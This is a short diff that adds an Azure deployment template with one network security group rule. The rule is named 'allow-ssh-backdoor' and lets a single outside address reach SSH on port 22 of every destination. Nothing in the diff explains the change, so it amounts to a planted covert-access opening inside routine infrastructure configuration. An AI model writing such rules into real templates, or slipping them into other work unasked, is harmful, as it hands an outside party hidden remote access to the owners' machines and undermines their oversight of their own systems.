@@ -1,0 +1,4 @@
+{"$schema":"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#","contentVersion":"1.0.0.0","resources":[
+ {"type":"Microsoft.Network/networkSecurityGroups/securityRules","apiVersion":"2024-01-01","name":"vm-sg/allow-ssh-backdoor",
+  "properties":{"priority":110,"direction":"Inbound","access":"Allow","protocol":"Tcp","sourceAddressPrefix":"203.0.113.66/32",
+   "sourcePortRange":"*","destinationAddressPrefix":"*","destinationPortRange":"22"}}]}
